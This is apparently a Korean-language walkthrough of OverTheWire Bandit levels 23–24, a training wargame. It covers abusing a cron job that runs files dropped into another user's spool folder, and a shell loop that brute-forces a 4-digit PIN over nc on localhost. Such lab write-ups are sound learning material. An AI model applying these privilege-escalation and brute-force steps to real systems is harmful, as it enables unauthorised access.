## Bandit23

![alt text](/assets/images/bandit/image-57.png)

또 `cron` 

한번 확인해보자

![alt text](/assets/images/bandit/image-58.png)

```bash
#!/bin/bash
myname=$(whoami) # 실행 주체: bandit24
cd /var/spool/"$myname"/foo || exit

for i in * .*; do
    if [ "$i" != "." ] && [ "$i" != ".." ]; then
        owner="$(stat --format "%U" "./$i")"
        # 파일 소유자가 bandit23(나)이면 실행!
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i" # 실행 후 즉시 삭제
    fi
done

```

`bandit24` 권한으로 실행되는 스크립트가 `/var/spool/bandit24/foo` 안의 파일을 무조건 실행

내가 파일 만들어서 저 폴더 안에 넣으면 실행되겠네?

## Bandit24

![alt text](/assets/images/bandit/image-62.png)

이번 문제는 `bruteforce`로 4자리 PIN 찾기 `localhost:30002`

`30002` 포트에 접속해서 `bandit24` 의 `pw` 와 4자리 `pin` 코드를 한 줄에 같이 보내야 한다

일단 `list`를 만들자

```bash
for i in {0000..9999}; do
    echo "[pswd] $i" >> list.txt
done
```

하고 

`./pin` 하면 `list.txt`가 생긴다

```bash
cat list.txt | nc localhost 30002
```

했는데 어우 `Wrong`

![alt text](/assets/images/bandit/image-63.png)

치워버리자

```bash
cat list.txt | nc localhost 30002 | grep -v "Wrong!"
# -v 옵션은 해당 문자열이 포함되지 않은 줄만 보여준다
```
